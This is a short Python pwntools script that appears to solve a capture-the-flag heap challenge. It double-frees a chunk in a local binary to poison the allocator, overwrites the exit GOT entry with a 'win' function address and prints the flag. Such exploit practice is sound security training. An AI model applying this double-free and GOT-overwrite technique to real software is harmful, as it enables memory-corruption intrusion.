#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./bin")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"size : ", str(size).encode())
    shell.sendlineafter(b"data : ", data)

def free(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"index : ", str(index).encode())

def exit():
    shell.sendlineafter(b"> ", b"3")

got_exit = p64(0x404070)
win = p64(0x401296)

malloc(0x18, b"A" * 8)

free(0)
free(0)

malloc(0x18, got_exit)
malloc(0x18, b"B" * 8)
malloc(0x18, win)

exit()

flag = shell.recvline_contains(b"flag").decode()[7:]
log.info(f"Flag: {flag}")
